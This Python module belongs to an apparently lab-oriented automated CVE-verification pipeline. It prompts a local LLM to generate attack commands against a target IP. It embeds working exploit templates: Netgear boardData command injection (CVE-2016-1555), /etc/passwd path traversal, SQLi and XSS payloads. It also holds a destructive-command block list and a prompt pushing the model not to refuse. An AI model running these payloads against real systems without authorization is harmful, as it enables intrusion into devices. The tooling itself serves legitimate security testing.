# Docker/ai/langchain/ai/generation.py
# ----------------------------------------------------------------------------
# SOP 版 Generation：唯一工作是「讀一個 CVE 的描述與 PoC，產生 N 條可直接執行的
# Linux 驗證指令」。這是 7B 做得還行的局部任務（有明確輸入輸出），不涉及流程決策。
# ----------------------------------------------------------------------------

import ast
import json
import os
import re
import secrets
import shlex
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutureTimeout

from ai.ollama import call_ollama_json, GENERATION_MODEL
from config.logging import log_info
from tool_config import POC_CMDS_SCHEMA, POC_FILE_SCHEMA


# =============================================================================
# ⚠️【單次 LLM 呼叫逾時保護】
# 症狀：qwen2.5-coder:7b 被連續操很多次後，偶爾某一次呼叫「卡住不回」，
#       而 ollama 呼叫若沒逾時，Python 就無限等 → 整條 Stage 4 凍在那一筆 CVE。
# 作法：把每一次 call_ollama_json 丟到背景執行緒，最多等 LLM_CALL_TIMEOUT 秒；
#       超時就放棄這一次（丟 TimeoutError 給呼叫端 → 走保底 / 跳過），換下一步。
#       卡住的那條執行緒設為 daemon，隨主程式自然收掉，不擋流程。
# 注意：這是「應用層」的保護。要讓底層 HTTP socket 也真的中斷，最乾淨的做法是
#       在 ai/ollama.py 建 ollama.Client 時加 timeout（見本次說明）。兩者並用最保險。
# =============================================================================
LLM_CALL_TIMEOUT = float(os.getenv("LLM_CALL_TIMEOUT", "90"))
# ⚠️【改寫 PoC 專屬逾時】改寫 PoC 要吐一整個可執行檔，是最重的任務，常比一般指令生成久很多。
#    給它獨立且較長的逾時，不必把全域 LLM_CALL_TIMEOUT/OLLAMA_TIMEOUT 一起調大。
#    可用環境變數 POC_ADAPT_TIMEOUT 調整（預設 180 秒）。
POC_ADAPT_TIMEOUT = float(os.getenv("POC_ADAPT_TIMEOUT", "180"))
_LLM_EXECUTOR = ThreadPoolExecutor(max_workers=4)

# =============================================================================
# 🛡️【破壞性指令黑名單（集中版）】
# prompt 叫 7B 別用破壞性指令,但小模型偶爾不聽——這是程式層的最後保險。
# 原本這條清單散在 _sanitize_cmd / generate_poc_cmds / adapt_poc_to_file 三處、
# 且只擋 rm -rf / mkfs / fork bomb,漏掉 reboot/shutdown/dd/寫檔等。集中成一條並加寬:
#   rm -rf、mkfs、fork bomb :(){、shutil.rmtree、
#   reboot/halt/shutdown/poweroff/init 0、dd if=、kill/killall、寫入根目錄 > /
# 任何函式要擋破壞性指令,一律用這條。
# =============================================================================
_DESTRUCTIVE_RE = re.compile(
    r"\brm\s+-rf\b|\bmkfs\b|\b:\(\)\s*\{|\bshutil\.rmtree\b|"
    r"\b(?:reboot|halt|shutdown|poweroff)\b|\binit\s+0\b|"
    r"\bdd\s+if=|\bkillall\b|\bkill\s+-9\b|>\s*/(?:etc|bin|sbin|dev|boot)\b"
)


def _call_llm_json_guarded(guard_timeout: float = None, **kwargs):
    """呼叫 call_ollama_json，最多等 guard_timeout 秒（預設 LLM_CALL_TIMEOUT）。
    超時丟 FutureTimeout，由各函式自行處理（保底或跳過）。
    kwargs 裡可帶 timeout=，一路傳到 call_ollama_json 設定底層 socket 逾時。"""
    gt = guard_timeout if guard_timeout else LLM_CALL_TIMEOUT
    future = _LLM_EXECUTOR.submit(call_ollama_json, **kwargs)
    return future.result(timeout=gt)


# =============================================================================
# 🎯【漏洞分類 + payload 模板庫 + 執行回顯 nonce】
# 背景：大多數 CVE 沒有現成 PoC，7B「無中生有」產 exploit 幾乎打不動。
# 對策：由「程式」提供各漏洞類別「已驗證的 payload 骨架」，7B 只負責填「打哪個端點、
#       哪個參數」——符合「程式控結構、LLM 填局部」的設計原則，命中率明顯提高。
# =============================================================================

def make_exec_nonce():
    """產生『執行回顯驗證碼』，用來證明指令真的在靶機上執行（而非被原樣反射）。
    回傳 (marker, echo_arg)：
      - marker：執行成功後應出現在回應中的乾淨字串，例如 PGT1a2b3c4d
      - echo_arg：放進 echo 的參數，中間插了 shell 空字串串接 ""，例如 PGT1a2b""3c4d
    只有 shell『真的執行』才會把 echo_arg 串成 marker；若伺服器只是把輸入原樣反射回來，
    回應裡會留著帶引號的 PGT1a2b""3c4d，而不是乾淨的 marker → 不會誤判成命中。"""
    h = secrets.token_hex(4)          # 8 hex
    marker = "PGT" + h                # 期望在回應看到的乾淨字串
    echo_arg = "PGT" + h[:4] + '""' + h[4:]   # 只有執行才會串成 marker
    return marker, echo_arg


# CWE → 類別；描述關鍵字為備援（RAG/NVD 不一定給 CWE）
_CWE_CLASS = {
    "78": "cmd_injection", "77": "cmd_injection", "74": "cmd_injection",
    "22": "path_traversal", "23": "path_traversal", "36": "path_traversal",
    "89": "sqli",
    "79": "xss",
    "287": "auth_bypass", "306": "auth_bypass", "288": "auth_bypass",
    "200": "info_disclosure", "538": "info_disclosure", "548": "info_disclosure",
    # —— report-only 類別（見 REPORT_ONLY_CLASSES）：分得出來,但 stage4_verify 只列報告不驗證 ——
    "352": "csrf",
    "16": "misconfiguration", "1188": "misconfiguration",
    "119": "buffer_overflow", "120": "buffer_overflow", "121": "buffer_overflow",
    "122": "buffer_overflow", "125": "buffer_overflow", "787": "buffer_overflow",
}
_DESC_CLASS_KEYWORDS = [
    ("cmd_injection",  ["command injection", "os command", "cmd injection", "remote code execution",
                         " rce", "arbitrary command", "shell command", "code execution"]),
    ("path_traversal", ["path traversal", "directory traversal", "arbitrary file read",
                         "arbitrary file download", "local file inclusion", "../"]),
    ("sqli",           ["sql injection", "sqli"]),
    ("xss",            ["cross-site scripting", "cross site scripting", "xss"]),
    ("auth_bypass",    ["authentication bypass", "auth bypass", "improper authentication",
                         "missing authentication", "unauthenticated"]),
    ("info_disclosure",["information disclosure", "information exposure", "sensitive information",
                         "credential disclosure", "configuration disclosure"]),
    # —— report-only 類別關鍵字（擺最後，讓上面可驗證的類別優先命中）——
    ("csrf",           ["cross-site request forgery", "cross site request forgery", "csrf"]),
    ("buffer_overflow",["buffer overflow", "stack-based buffer", "stack overflow",
                         "heap overflow", "out-of-bounds write", "out of bounds write"]),
    ("misconfiguration",["security misconfiguration", "improperly configured", "misconfiguration",
                         "insecure default", "improper access control"]),
]

# report-only 類別：能分類、但現有 _judge_success(nonce/root:x:0:0/uid=0…) 驗不出來。
# stage4_verify 會比照 DoS 把這些只列報告、不進驗證迴圈（見 main.py）。
REPORT_ONLY_CLASSES = {"csrf", "buffer_overflow", "misconfiguration"}


def classify_cve(cve: dict) -> str:
    """程式判斷 CVE 屬於哪個漏洞類別（給模板庫選對 payload 骨架）。
    先看 CWE 欄位，再用描述關鍵字；都判不出回 'generic'。"""
    # 1) CWE 欄位（相容多種鍵名/格式，如 'CWE-78'、'78'、list）
    cwe_raw = cve.get("cwe") or cve.get("cweID") or cve.get("cwe_id") or cve.get("CWE") or ""
    cwe_text = " ".join(cwe_raw) if isinstance(cwe_raw, list) else str(cwe_raw)
    for num in re.findall(r"(\d{1,4})", cwe_text):
        if num in _CWE_CLASS:
            return _CWE_CLASS[num]
    # 2) 描述關鍵字備援
    desc = (cve.get("description") or "").lower()
    for cls, kws in _DESC_CLASS_KEYWORDS:
        if any(k in desc for k in kws):
            return cls
    return "generic"


# 各類別「已驗證的 payload 骨架」。佔位符：
#   {BASE}=http://TARGET_IP（程式會換成真 IP）、{EP}=真實端點路徑、{PARAM}=參數名、{NONCE}=echo_arg
# cmd_injection 全部用 {NONCE} 當「執行回顯」錨點 → 只有真的執行才會回顯 marker。
PAYLOAD_TEMPLATES = {
    "cmd_injection": [
        # —— ★Netgear ProSAFE boardData*.php 專用（CVE-2016-1555 家族，最優先）——
        #    注入點是固定參數 macAddress，而且【必須】同時帶 reginfo=0 與 writeData=Submit
        #    這兩個欄位，PHP 才會走到執行 system() 的程式路徑；少任一個 → 不執行 → 永遠打不中
        #    （舊版只送單一 {PARAM}=;id，CVE-2016-1555 五次全滅就是因為少了這兩個欄位）。
        #    值的格式：假 MAC + ; + 驗證指令 + ; + #（# 把後面原本串接的指令註解掉）。
        #    {EP} 換成 RECON CONTEXT 裡的真實 boardData 端點（boardDataWW.php / boardDataNA.php…）。
        #    ⚠️ 本漏洞是「盲注」：指令會執行但 stdout 不回顯到 HTTP 回應。echo/id 版只有在
        #       少數會回顯的韌體看得到；通用解是下面的「時間差」模板（sleep + 量回應秒數）。
        "curl -s '{BASE}{EP}' --data-urlencode 'macAddress=112233445566;echo {NONCE};#' --data 'reginfo=0' --data 'writeData=Submit'",
        "curl -s '{BASE}{EP}' --data-urlencode 'macAddress=112233445566;id;#' --data 'reginfo=0' --data 'writeData=Submit'",
        # —— ★盲注時間差驗證（boardData 家族；回應不回顯內容時用這條）——
        #    -w 'OOB_SECONDS=%{time_total}' 讓 curl 把「整個請求的總耗時」印到 stdout。
        #    靶機真的執行 sleep 7 → 回應約 7 秒 → OOB_SECONDS≈7；沒執行 → ≈0.x。
        #    判定端看 OOB_SECONDS 是否 ≥ 門檻即可確認盲注 RCE（見 main.py 的時間差判定規則）。
        "curl -s -o /dev/null -w 'OOB_SECONDS=%{time_total}' --max-time 25 '{BASE}{EP}' --data-urlencode 'macAddress=112233445566;sleep 7;#' --data 'reginfo=0' --data 'writeData=Submit'",
        # —— 一般單參數 POST 變體（其他吃 POST form 的 sink）——
        #    curl --data-urlencode 不帶 -G ＝ POST body(application/x-www-form-urlencoded)
        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=;echo {NONCE};'",
        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=|echo {NONCE}'",
        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=`echo {NONCE}`'",
        "curl -s '{BASE}{EP}' --data-urlencode '{PARAM}=$(echo {NONCE})'",
        # —— 一般單參數盲注時間差（非 boardData 的 sink 也可能是盲注）——
        "curl -s -o /dev/null -w 'OOB_SECONDS=%{time_total}' --max-time 25 '{BASE}{EP}' --data-urlencode '{PARAM}=;sleep 7;#'",
        # —— GET 變體（參數走 query string 的 *.cgi 類 sink）——
        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=;echo {NONCE};'",
        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=`echo {NONCE}`'",
        "curl -s '{BASE}{EP}?{PARAM}=%3Becho%20{NONCE}%3B'",
        # —— GET 盲注時間差 ——
        "curl -s -o /dev/null -w 'OOB_SECONDS=%{time_total}' --max-time 25 -G '{BASE}{EP}' --data-urlencode '{PARAM}=;sleep 7;#'",
    ],
    "path_traversal": [   # HTTP 路徑穿越（預設）
        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=../../../../../../etc/passwd'",
        "curl -s '{BASE}{EP}?{PARAM}=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'",
        "curl -s '{BASE}{EP}?{PARAM}=....//....//....//....//etc/passwd'",
        "curl -s '{BASE}{EP}?{PARAM}=/etc/passwd'",
    ],
    # TFTP 服務（UDP/69）的目錄穿越：一律用 curl tftp://（curl 必裝、輸出進 stdout 好判定）。
    # ⚠️ 不用 `tftp` client——容器通常沒裝、且各家互動語法不一；--path-as-is 防止 curl 把 ../ 正規化掉。
    # TFTP 服務（UDP/69）目錄穿越。-m 10：無回應 10 秒收手。
    # ⚠️ 實測許多 TFTP server（如 D-Link DIR-601）不接受字面 `../` 穿越、會沉默不回；
    #    但由 curl 化簡後送出的「絕對路徑 /etc/passwd」卻讀得到（TFTP 根目錄＝檔案系統根）。
    #    所以【預設不要 --path-as-is】，讓 curl 化簡；字面穿越(--path-as-is)只當最後 fallback。
    "path_traversal:tftp": [
        "curl -s -m 10 'tftp://{IP}/etc/passwd'",
        "curl -s -m 10 'tftp://{IP}/../../../../etc/passwd'",
        "curl -s -m 10 'tftp://{IP}/../../../../../../etc/passwd'",
        "curl -s -m 10 --path-as-is 'tftp://{IP}/../../../../../../etc/passwd'",
    ],
    "path_traversal:ftp": [    # FTP 服務（TCP/21）的目錄穿越（同理，先讓 curl 化簡）
        "curl -s -m 10 'ftp://{IP}/etc/passwd'",
        "curl -s -m 10 'ftp://{IP}/../../../../etc/passwd'",
        "curl -s -m 10 --path-as-is 'ftp://{IP}/../../../../../../etc/passwd'",
    ],
    "sqli": [
        "curl -s -G '{BASE}{EP}' --data-urlencode \"{PARAM}=' OR '1'='1\"",
        "curl -s -G '{BASE}{EP}' --data-urlencode \"{PARAM}=1' AND '1'='2\"",
        "curl -s -G '{BASE}{EP}' --data-urlencode \"{PARAM}=1' OR SLEEP(5)-- -\"",
        "curl -s -G '{BASE}{EP}' --data-urlencode \"{PARAM}=1 UNION SELECT 1,2,3-- -\"",
    ],
    "xss": [
        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=<script>{NONCE}</script>'",
        "curl -s -G '{BASE}{EP}' --data-urlencode '{PARAM}=\"><svg onload={NONCE}>'",
    ],
    "auth_bypass": [
        "curl -s -i '{BASE}{EP}'",
        "curl -s -i '{BASE}{EP}' -H 'X-Forwarded-For: 127.0.0.1'",
        "curl -s -i '{BASE}{EP}' -H 'Referer: {BASE}/'",
    ],
    "info_disclosure": [
        "curl -s -i '{BASE}{EP}'",
        "curl -s '{BASE}{EP}'",
    ],
}

# 哪些類別用 nonce 回顯當命中錨點（可執行指令的類別）
_NONCE_CLASSES = {"cmd_injection", "xss"}

# 各類別「該打哪種端點、該填哪種參數名」的提示。
# 這是為了解決「7B 把 payload 套到錯的端點/欄位」的問題——例如把路徑穿越套到登入頁的
# username 欄位（那不是檔案讀取的入口）。這裡給它『典型的參數名 + 端點挑選準則』，
# 讓它從 RECON CONTEXT 裡挑對位置，而不是硬套在登入表單。
_SINK_HINTS = {
    "cmd_injection": {
        # macAddress 擺第一：Netgear boardData*.php 的注入點就是它，優先試。
        "params": ["macAddress", "ip", "ipaddr", "ping_addr", "pingaddr", "host", "hostname",
                   "addr", "target", "cmd", "command", "url", "action", "sysCmd"],
        "endpoint": (
            "目標：會把輸入拼進『系統指令』執行的端點。\n"
            "✓ 命中訊號：功能本身要對外互動——ping / traceroute / nslookup / DDNS 測試 / "
            "韌體或網路診斷；路徑常見 boardData*.php（boardDataWW.php / boardData102.php / "
            "boardDataNA.php…，Netgear ProSAFE 系列,未授權表單直接進 CLI,走 POST）"
            "或 *.cgi（ping.ccp、diagnostic.cgi、apply.cgi、hedwig.cgi，D-Link 系列）。\n"
            "★【boardData*.php 鐵則】注入點固定是 macAddress 參數，且 POST body【必須】同時含 "
            "reginfo=0 與 writeData=Submit 兩個欄位，少任一個 PHP 就不執行指令、必定打不中。"
            "→ 直接照抄上面 boardData 模板（已內含這三個欄位），只把 {EP} 換成真實 boardData 端點，"
            "千萬不要只送單一 cmd= 或 macAddress= 參數。\n"
            "★【盲注提醒】這類漏洞多為『盲注』——指令會執行但輸出不回顯到 HTTP 回應（你只會收到"
            "原本的表單頁，看不到 id/echo 的結果）。此時【務必】用含 OOB_SECONDS 的『時間差』模板"
            "（注入 sleep 7、用 curl -w 量回應秒數）來驗證，不要因為沒看到回顯就判定失敗。\n"
            "✗ 跳過：純登入、純顯示、靜態頁。\n"
            "參數名只是線索：看到上列名稱優先試,但真正判準是『這個值最後會不會進 shell』。"
        ),
    },
    "path_traversal": {
        "params": ["file", "filename", "path", "page", "download", "f", "src", "dir", "folder",
                   "template", "lang", "doc", "read", "load", "view", "getpage", "img", "image"],
        "endpoint": (
            "目標：會依參數值去『讀取/回傳檔案』的端點。\n"
            "✓ 命中訊號：download / getcfg / 檔案或圖片處理 / 語系或樣板載入 / *.cgi；"
            "回應的 Content-Type 是檔案或 body 會隨參數換內容。\n"
            "✗ 跳過：登入頁的 username/password 不是路徑穿越入口,別套。\n"
            "參數名是線索,核心判準是『這個值會不會被當成檔名/路徑拿去開檔』。"
        ),
    },
    "sqli": {
        "params": ["id", "uid", "user", "username", "search", "q", "query", "name", "cat",
                   "category", "page", "pid", "gid"],
        "endpoint": (
            "目標：參數值會進 DB 查詢的端點。\n"
            "✓ 命中訊號：登入驗證 / 搜尋 / 清單 / 明細頁;改動參數會讓回傳筆數或內容改變。\n"
            "✗ 跳過：回應完全不隨參數變化的靜態端點。\n"
            "註:嵌入式 AP 常把設定存 NVRAM/flat-file 而非 SQL,此類命中率偏低屬正常。"
        ),
    },
    "xss": {
        "params": ["q", "search", "keyword", "name", "msg", "message", "s", "query", "input"],
        "endpoint": (
            "目標：會把輸入『原樣回顯到頁面』的端點(反射型)。\n"
            "✓ 命中訊號：搜尋框結果頁 / 錯誤訊息頁 / 留言或表單回填;送進去的字串原封出現在 HTML。\n"
            "✗ 跳過：輸入只進後端不回顯的端點。"
        ),
    },
    "auth_bypass": {
        "params": [],
        "endpoint": (
            "目標：『本應需登入』的管理/設定端點,未授權直接打看能不能拿到內容。\n"
            "✓ 命中訊號：admin / setup / getcfg / 系統資訊 / 設定儲存;未帶 session 仍回 200 且有實際內容。\n"
            "重點在端點本身,參數通常不是關鍵。判準是『沒登入卻拿到了只有登入才該看到的東西』。"
        ),
    },
    "info_disclosure": {
        "params": [],
        "endpoint": (
            "目標：未授權就可能外洩敏感資料的端點。\n"
            "✓ 命中訊號：設定備份(getcfg/backup) / 狀態頁 / 版本資訊 / 可直接取的 .xml .cfg .bak;"
            "回傳含帳密、金鑰、內網拓撲、序號等。\n"
            "判準是『內容本身敏感』,不是單純回 200。"
        ),
    },

    # —— 以下三類『現有 _judge_success(nonce/root:x:0:0/uid=0…) 驗不出來』——
    #    已在 REPORT_ONLY_CLASSES 標記,stage4_verify 會比照 DoS 只列報告、不自動驗證。
    #    下面 endpoint 描述寫的是「實際測得到的徵兆」,而非驗不出來的最終證明。
    "csrf": {
        "params": [],
        "endpoint": (
            "目標：缺乏不可預測 Token、可被跨站偽造請求來改設定/密碼的端點。\n"
            "⚠️ 單機 curl 無法真正『證明』CSRF(需受害者已登入瀏覽器+跨站觸發);"
            "自動化只能抓『徵兆』。\n"
            "✓ 可偵測徵兆：會改系統設定/密碼的 POST 請求裡不含任何 anti-CSRF token,"
            "或移除/偽造 Referer、Origin 後仍被接受並生效。\n"
            "判準建議:歸『已識別、不自動驗證』,不強求 shell 回顯。"
        ),
    },
    "buffer_overflow": {
        "params": ["input", "buffer", "data", "len", "size"],
        "endpoint": (
            "目標：未對輸入/標頭長度做邊界檢查,導致堆疊/堆積緩衝區溢位的端點或常式。\n"
            "⚠️ 與本專案『不打崩靶機』原則衝突,崩潰(segfault)在 HTTP 回應端也看不到;"
            "此類多半已被 _is_dos_cve 當 DoS 略過。\n"
            "判準建議:一律歸『已識別、不自動驗證』,不實際送超長 payload,以免靶機崩潰中斷後續測試。"
        ),
    },
    "misconfiguration": {
        "params": [],
        "endpoint": (
            "目標：安全設定配置不當(預設存取控制過寬、未啟用安全旗標、暴露不必要服務)。\n"
            "⚠️ 範圍發散,難用成功關鍵字判定。\n"
            "✓ 可偵測徵兆：敏感端點未授權即可達、敏感連接埠預設開啟、回應缺安全標頭。\n"
            "判準建議:歸『已識別、不自動驗證』,佐以 recon/指紋證據寫報告。"
        ),
    },

    # —— 協定特化:路徑穿越不一定在 HTTP,可能在 TFTP/FTP ——
    "path_traversal:tftp": {
        "params": [],
        "endpoint": (
            "此 CVE 的穿越在 **TFTP 服務(UDP/69)**,不是 HTTP,沒有 HTTP 端點/參數要填。\n"
            "前置:先確認 recon 顯示 udp/69 open(TFTP 無連線,掃描常報 open|filtered,"
            "可直接嘗試取檔驗證)。\n"
            "做法:TFTP 無認證、直接開路徑——先試『絕對路徑』(curl tftp://<target>/etc/passwd),"
            "不中再試 ../ 逐步加深(../../../../etc/passwd)。\n"
            "✓ 命中:回傳目標檔內容(讀到 /etc/passwd 會含 root:x:0:0,直接命中成功關鍵字)。\n"
            "✗ 未命中:timeout(多半是 NAT/防火牆擋 UDP 回包,先排除網路再判定漏洞)"
            "或 'File not found'(路徑或深度不對,換 payload)。"
        ),
    },
    "path_traversal:ftp": {
        "params": [],
        "endpoint": (
            "此 CVE 的穿越在 **FTP 服務(TCP/21)**,無 HTTP 端點/參數。\n"
            "前置:recon 確認 tcp/21 open,並先確認『匿名登入(anonymous)或預設帳密』可用。\n"
            "做法:curl ftp://<target>/<穿越路徑>(需要時帶 -u user:pass),"
            "或 FTP client 用 RETR/GET 取穿越路徑;先試絕對路徑再試 ../ 加深。\n"
            "✓ 命中:取回目標檔(讀到 /etc/passwd 含 root:x:0:0 即命中成功關鍵字)。\n"
            "✗ 未命中:權限拒絕或路徑錯,調整 ../ 深度與起始目錄。"
        ),
    },
}

# 傳輸協定偵測：路徑穿越等類別可能走 HTTP / TFTP / FTP，需用不同工具。
# 先判 tftp（字串含 ftp，必須先比對 tftp 以免被 'ftp' 誤判）。
def _detect_transport(cve: dict) -> str:
    blob = " ".join([
        str(cve.get("description", "")),
        str(cve.get("service", "")),
        str(cve.get("product", "")),
    ]).lower()
    if "tftp" in blob:
        return "tftp"
    if re.search(r"\bftp\b", blob):
        return "ftp"
    return "http"


def _effective_template_key(vuln_class: str, cve: dict) -> str:
    """路徑穿越依協定選對模板組；其餘類別維持原 class。"""
    if vuln_class == "path_traversal":
        t = _detect_transport(cve)
        composite = f"path_traversal:{t}"
        if composite in PAYLOAD_TEMPLATES:
            return composite
    return vuln_class


def _templates_block(vuln_class: str, target_ip: str, nonce_echo: str) -> str:
    """把某類別的模板列成 prompt 文字，佔位符原樣保留讓 7B 依真實端點填。
    vuln_class 可帶協定後綴（如 path_traversal:tftp）；sink/nonce 以冒號前的基礎類別判定。"""
    tpls = PAYLOAD_TEMPLATES.get(vuln_class)
    if not tpls:
        return ""
    base_class = vuln_class.split(":")[0]
    base = f"http://{target_ip}"
    lines = []
    for i, t in enumerate(tpls, 1):
        shown = (t.replace("{BASE}", base).replace("{IP}", target_ip)
                  .replace("{NONCE}", nonce_echo or "PGTxxxx"))
        lines.append(f"  T{i}: {shown}")
    hint = ""
    if base_class in _NONCE_CLASSES and nonce_echo:
        hint = ("\n  （{NONCE} 已填入執行回顯驗證碼，請原樣保留，不要改動它——"
                "只有靶機真的執行才會把它回顯出來。）")

    # 端點/參數挑選提示：解決「payload 套到錯端點/錯欄位」的問題
    #   優先用帶協定後綴的精確提示(如 path_traversal:tftp)，否則退回基礎類別提示
    sink = _SINK_HINTS.get(vuln_class) or _SINK_HINTS.get(base_class, {})
    sink_block = ""
    if sink.get("endpoint"):
        sink_block += f"\n端點挑選：{sink['endpoint']}"
    if sink.get("params"):
        sink_block += ("\n{PARAM} 典型參數名（從 RECON CONTEXT 找有這類參數的端點優先；找不到才合理猜）："
                        + ", ".join(sink["params"]))
    sink_block += ("\n⚠️ 若 RECON CONTEXT 裡沒有符合上述『端點/協定類型』的入口，代表這台裝置可能沒有對應的"
                   "可利用介面——不要硬套在登入頁等不相干端點反覆試，直接回 done=true 並說明。")

    return ("PROVEN PAYLOAD TEMPLATES for this CVE class "
            f"（漏洞類別：{vuln_class}）。你【必須】挑其中一條；HTTP 類把 {{EP}} 換成 RECON CONTEXT 裡"
            "『類型正確』的真實端點、{PARAM} 換成下列典型參數名；TFTP/FTP 類模板已完整，直接用，"
            "不要自己發明 payload 結構：\n"
            + "\n".join(lines) + hint + sink_block + "\n")


POC_SYSTEM_PROMPT = """You are a penetration testing PoC command generator powered by Qwen2.5-Coder.
Given ONE CVE (its ID, description and any PoC hints), produce concrete Linux shell commands that
attempt to VERIFY whether the target is vulnerable.

TOOL SELECTION — pick the tool that matches the SERVICE/PROTOCOL of this CVE.
Do NOT default to curl for everything; curl only speaks HTTP(S).
  • HTTP / HTTPS / CGI / SOAP / HNAP / REST  → curl  (use -X METHOD, -H headers, --data, -b cookies, --path-as-is)
  • HTTPS cert / TLS inspection              → openssl s_client -connect IP:PORT
  • Raw TCP banner / custom binary protocol  → nc (netcat), or  python3 -c 'import socket;...'  to send/recv bytes
  • DNS (udp/53)                             → dig @IP ... / nslookup
  • SNMP (udp/161)                           → snmpwalk -v2c -c public IP / snmpget
  • UPnP / SSDP (udp/1900)                   → curl the XML description URL, or python3 socket M-SEARCH
  • NTP (udp/123)                            → ntpq -c rv IP / python3 ntp probe
  • SMB / Telnet / FTP / other TCP           → the service's own client (smbclient, telnet, ftp) or nc
  • Multi-step logic, struct packing, loops  → a short  python3 -c "..."  one-liner (stdlib only: socket, urllib, http.client, struct)
Use the RECON CONTEXT (open ports + service names) to decide which applies.

STRICT RULES:
1. Output ONLY a JSON object: {"commands": ["cmd1", "cmd2", ...]}.
2. Every command must be a single-line, directly-runnable Linux shell command, using the RIGHT tool
   from TOOL SELECTION above for this CVE's protocol — not always curl.
3. Commands MUST target the given TARGET_IP. Never use example.com or placeholder IPs.
4. Prefer safe verification over destructive actions: send the PoC request / query and let the
   caller inspect the response; do not try to brick or wipe the device.
5. Produce DIFFERENT approaches across the commands — ideally spanning more than one tool when the
   CVE allows (e.g. a curl probe AND a python socket check), not the same command repeated.
6. If the CVE cannot be meaningfully tested with a shell command, still output your best-effort
   probing commands (e.g. a banner grab with nc, or curl the service root) rather than refusing.
7. Do NOT append output filters like | grep / | head; return the raw command so the caller sees
   the FULL response. Keep any quoting balanced.
8. No markdown, no commentary, JSON only.
"""


def _fallback_cmds(cve: dict, target_ip: str, n: int) -> list:
    """7B 失敗時的保底指令：至少對目標做基本探測，確保 Stage 4 有東西可跑。"""
    cid = cve.get("cve_id") or cve.get("cveID") or "CVE"
    base = [
        f"curl -i -s http://{target_ip}/",
        f"curl -i -s -X POST http://{target_ip}/",
        f"curl -s -A 'PoC-{cid}' http://{target_ip}/",
        f"curl -i -s http://{target_ip}/cgi-bin/",
        f"curl -i -s http://{target_ip}/HNAP1/",
    ]
    return base[:n]


def _sanitize_cmd(c, target_ip: str):
    """清洗單條指令：換掉 placeholder、剝掉吃輸出的過濾管線、擋壞引號/外部網址/破壞性指令。
    合格回傳清洗後字串；不合格回 None（呼叫端會改走保底探測）。"""
    if not isinstance(c, str) or not c.strip():
        return None
    c = c.strip()
    c = c.replace("example.com", target_ip).replace("TARGET_IP", target_ip)
    c = c.replace("<target>", target_ip).replace("{target}", target_ip)

    # 🧹 剝掉會「吃掉/過濾輸出」的尾段管線(grep/head/awk/sed…)——判定要完整原始回應,
    #    過濾交給 _judge_success。7B 常自己加 | grep PGT 把要判定的證據濾光(報告裡
    #    CVE-2016-1555 五次全因此變「無文字輸出」)。只砍 filter 類,不動輸入側管線。
    c = re.sub(
        r"\s*\|\s*(?:grep|egrep|fgrep|head|tail|awk|cut|sed|wc|sort|uniq|tr|less|more)\b.*$",
        "", c,
    ).strip()
    if not c:
        return None

    # 🧯 引號不平衡 → 送出去必爆(/bin/sh: Unterminated quoted string),丟棄走保底。
    #    7B 常把模板的單引號改成雙引號又多塞一個引號,就是這種壞指令。用 shell 自己的
    #    parser(shlex)判定,比數引號準,也不會誤殺 "it's" 這種合法內嵌引號。
    try:
        shlex.split(c)
    except ValueError:
        return None

    # 指令裡若出現 http(s) 但完全沒提到 target_ip，視為亂填，丟棄
    if ("http://" in c or "https://" in c) and target_ip not in c:
        return None
    # 擋掉明顯破壞性指令（集中黑名單）
    if _DESTRUCTIVE_RE.search(c):
        return None
    return c


def generate_poc_cmds(cve: dict, target_ip: str, n: int = 5, context: str = "") -> list:
    """讓 7B 針對單一 CVE 產生 n 條驗證指令；失敗則回退到保底探測指令。
    context：偵察階段得到的真實端點/裝置資訊，讓 7B 打對位置而非亂猜。"""
    cve_id = cve.get("cve_id") or cve.get("cveID") or "UNKNOWN"

    poc_hint = ""
    poc_list = cve.get("PoC", [])
    if isinstance(poc_list, list) and poc_list:
        # 只取前 2 筆、各截 800 字，避免 context 爆掉
        poc_hint = "\n".join(str(p)[:800] for p in poc_list[:2])

    context_block = ""
    if context:
        context_block = (
            f"\nRECON CONTEXT (real endpoints/services discovered on THIS target — "
            f"PREFER these over guessing generic paths like /status or /api):\n{context[:1800]}\n"
        )

    user_payload = (
        f"TARGET_IP: {target_ip}\n"
        f"CVE_ID: {cve_id}\n"
        f"CVSS: {cve.get('score') or cve.get('cvss') or 'N/A'}\n"
        f"DESCRIPTION:\n{str(cve.get('description', ''))[:1500]}\n"
        f"{context_block}\n"
        f"POC_HINTS (may be empty):\n{poc_hint[:1500]}\n\n"
        f"Produce exactly {n} DIFFERENT verification commands as JSON {{\"commands\": [...]}}. "
        f"When relevant, target the real endpoints listed in RECON CONTEXT."
    )

    try:
        resp = _call_llm_json_guarded(
            system_prompt=POC_SYSTEM_PROMPT,
            user_content=user_payload,
            response_schema=POC_CMDS_SCHEMA,
            model_name=GENERATION_MODEL,
        )
    except FutureTimeout:
        log_info.warn(
            f"⏱️ [Generation] {cve_id} 產生指令超過 {LLM_CALL_TIMEOUT}s 未回應（LLM 疑似卡住），"
            f"放棄本次、改用保底指令並繼續下一步。"
        )
        return _fallback_cmds(cve, target_ip, n)
    except Exception as e:
        log_info.warn(f"⚠️ [Generation] {cve_id} 產生指令例外: {e}，改用保底指令。")
        return _fallback_cmds(cve, target_ip, n)

    cmds = []
    if isinstance(resp, dict):
        raw_cmds = resp.get("commands", [])
        if isinstance(raw_cmds, list):
            for c in raw_cmds:
                if isinstance(c, str) and c.strip():
                    cmds.append(c.strip())

    # 安全網：強制每條指令都指向 target_ip、過濾外部網址與破壞性指令（共用 _sanitize_cmd）
    safe_cmds = []
    for c in cmds:
        cleaned = _sanitize_cmd(c, target_ip)
        if cleaned:
            safe_cmds.append(cleaned)

    if not safe_cmds:
        log_info.warn(f"⚠️ [Generation] {cve_id} 未產出有效指令，改用保底指令。")
        return _fallback_cmds(cve, target_ip, n)

    # 不足 n 條就補保底
    if len(safe_cmds) < n:
        for fb in _fallback_cmds(cve, target_ip, n):
            if fb not in safe_cmds:
                safe_cmds.append(fb)
            if len(safe_cmds) >= n:
                break

    return safe_cmds[:n]


# =============================================================================
